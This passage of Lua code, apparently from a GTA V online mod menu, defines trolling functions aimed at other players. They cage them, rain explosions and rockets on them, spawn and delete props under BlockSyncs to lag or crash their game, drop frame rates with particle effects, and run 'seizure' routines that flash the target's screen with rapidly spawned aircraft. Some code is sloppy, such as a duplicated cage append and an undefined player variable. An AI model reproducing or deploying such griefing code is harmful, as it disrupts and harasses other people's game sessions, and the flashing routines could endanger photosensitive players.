	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield()
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)

	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--电击笼
local spawned_objects = {}
function djlz()
        local number_of_cages = 4
        local elec_box = util.joaat("prop_elecbox_12")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        pos.z -= 0.5
        request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.1)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90, 0, angle, 2, 0)
                obj_pos.z += 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
end
--竞技管
function jjglz()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(2081936690)

		while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)
		local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--折腾玩家
function SE_add_explosion(x, y, z, exptype, dmgscale, isheard, isinvis, camshake, nodmg)
    FIRE.ADD_EXPLOSION(x, y, z, exptype, dmgscale, isheard, isinvis, camshake, nodmg)
end

function SE_add_owned_explosion(ped, x, y, z, exptype, dmgscale, isheard, isinvis, camshake)
    FIRE.ADD_OWNED_EXPLOSION(ped, x, y, z, exptype, dmgscale, isheard, isinvis, camshake)
end
--原子弹
function orbital(pid) 
    for i = 0, 30 do 
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for j = -2, 2 do 
            for k = -2, 2 do 
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x + j, pos.y + j, pos.z + (30 - i), 29, 999999.99, true, false, 8)
            end
        end
        util.yield(20)
    end
end
--火箭雨
function rain_rockets(pid, owned)
		local user_ped = PLAYER.PLAYER_PED_ID()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		local owner
		local hash = util.joaat("weapon_airstrike_rocket")
		if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
			WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
		end
		pos.x = pos.x + math.random(-6,6)
		pos.y = pos.y + math.random(-6,6)
		local ground_ptr = memory.alloc(32); MISC.GET_GROUND_Z_FOR_3D_COORD(pos.x, pos.y, pos.z, ground_ptr, false, false); pos.z = memory.read_float(ground_ptr); memory.free(ground_ptr)
		if owned then owner = user_ped else owner = 0 end
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+50, pos.x, pos.y, pos.z, 200, true, hash, owner, true, false, 2500.0)
	end
--大风车
function windmills(pid)
    BlockSyncs(pid, function()
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        util.yield(1000)
        entities.delete_by_handle(object)
    end)
end
--烟雾掉帧
function smoke(pid)
local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
local player_pos = players.get_position(pid)
menu.set_value(freeze_toggle, true)
request_ptfx_asset("core")
GRAPHICS.USE_PARTICLE_FX_ASSET("core")
GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
    "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
menu.set_value(freeze_toggle, false)
end
--6闪
function seizurev6(pid)
local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3

local khanjali = util.joaat("prop_mp_num_6")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    util.yield()
end

local vehicle1 = entities.create_object(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 2), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_object(khanjali, playerpos, 0)
local vehicle3 = entities.create_object(khanjali, playerpos, 0)
local vehicle4 = entities.create_object(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
util.yield(0)
entities.delete_by_handle(vehicle1)
entities.delete_by_handle(vehicle2)
entities.delete_by_handle(vehicle3)
entities.delete_by_handle(vehicle4)
end
--闪屏 V1
function seizurev1(pid)
local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3

local khanjali = util.joaat("cargobob")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    util.yield()
end

local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
util.yield(0)
entities.delete_by_handle(vehicle1)

local khanjali = util.joaat("kosatka")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    util.yield()
end

local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
util.yield(0)
entities.delete_by_handle(vehicle1)
end
--闪屏 V2
function seizurev2(pid)
local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3

local khanjali = util.joaat("cargoplane")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    util.yield()
end

local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, 180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, 180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
util.yield(0)
entities.delete_by_handle(vehicle1)

local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3

local khanjali = util.joaat("cargoplane")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    util.yield()
end

local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
util.yield(0)
entities.delete_by_handle(vehicle1)

local khanjali = util.joaat("cargobob")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    util.yield()
end

local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
util.yield(0)
entities.delete_by_handle(vehicle1)

local khanjali = util.joaat("kosatka")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    util.yield()
end

local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
util.yield(0)
entities.delete_by_handle(vehicle1)
end
--传送物品给玩家
local function tpTableToPlayer(tbl, pid)
    if NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then
        local c = getEntityCoords(getPlayerPed(pid))
        for _, v in pairs(tbl) do
            if (not PED.IS_PED_A_PLAYER(v)) then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(v, c.x, c.y, c.z, false, false, false)
            end
        end
    end
end
--传送所有PED给玩家
function TpAllPeds(player)
    local pedHandles = entities.get_all_peds_as_handles()
    tpTableToPlayer(pedHandles, player)
end
--传送所有载具给玩家
function TpAllVehs(player)
    local vehHandles = entities.get_all_vehicles_as_handles()
    tpTableToPlayer(vehHandles, player)
end
--传送所有物体给玩家
function TpAllObjects(player)
    local objHandles = entities.get_all_objects_as_handles()
    tpTableToPlayer(objHandles, player)
end
--传送所有拾取物给玩家
function TpAllPickups(player)
    local pickupHandles = entities.get_all_pickups_as_handles()
    tpTableToPlayer(pickupHandles, player)
end
--假钱雨
function Streamptfx(lib)
        STREAMING.REQUEST_NAMED_PTFX_ASSET(lib)
        while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(lib) do
            util.yield()
        end
        GRAPHICS.USE_PARTICLE_FX_ASSET(lib)
    end
--外星人爆炸循环
function alien_explosion_loop(pid) 
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    STREAMING.REQUEST_MODEL(ufo)
    while not STREAMING.HAS_MODEL_LOADED(ufo) do
        STREAMING.REQUEST_MODEL(ufo)
        util.yield()
    end
    c.z = c.z + 10
    local spawnedufo = entities.create_object(ufo, c) --creates ufo
    util.yield(2000)
    c = ENTITY.GET_ENTITY_COORDS(p)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 3.0, false)
    util.yield(1000)
    entities.delete_by_handle(spawnedufo)
    menu.trigger_commands("freeze".. players.get_name(pid).. " off")
end
--外星人爆炸
function alien_explosion(pid) 
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    STREAMING.REQUEST_MODEL(ufo)
    while not STREAMING.HAS_MODEL_LOADED(ufo) do
        STREAMING.REQUEST_MODEL(ufo)
        util.yield()
    end
    menu.trigger_commands("freeze".. players.get_name(pid).. " on")
    c.z = c.z + 10
    local spawnedufo = entities.create_object(ufo, c) --creates ufo
    util.yield(2000)
    c = ENTITY.GET_ENTITY_COORDS(p)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 3.0, false)
    util.yield(1000)
    entities.delete_by_handle(spawnedufo)
    menu.trigger_commands("freeze".. players.get_name(pid).. " off")
end
--掉猴子
function monkey_drop(pid)
    PlayerName = PLAYER.GET_PLAYER_NAME(pid)
		
    local hash = util.joaat("a_c_chimp")
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        STREAMING.REQUEST_MODEL(hash)
        util.yield()
    end
    for i = 1, 69 do
        PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        MonkeCoords = {
            ["x"] = PlayerCoords.x,
            ["y"] = PlayerCoords.y,
            ["z"] = PlayerCoords.z + 3
        }
        entities.create_ped(28, hash, MonkeCoords, 0)
        util.yield(50)
    end
end
--掉CXK
function chicken_drop(pid)
    PlayerName = PLAYER.GET_PLAYER_NAME(pid)
		
    local hash = util.joaat("a_c_hen")
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        STREAMING.REQUEST_MODEL(hash)
        util.yield()
    end
    for i = 1, 69 do
        PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        MonkeCoords = {
            ["x"] = PlayerCoords.x,
            ["y"] = PlayerCoords.y,
            ["z"] = PlayerCoords.z + 3
        }
        entities.create_ped(28, hash, MonkeCoords, 0)
        util.yield(50)
    end
end

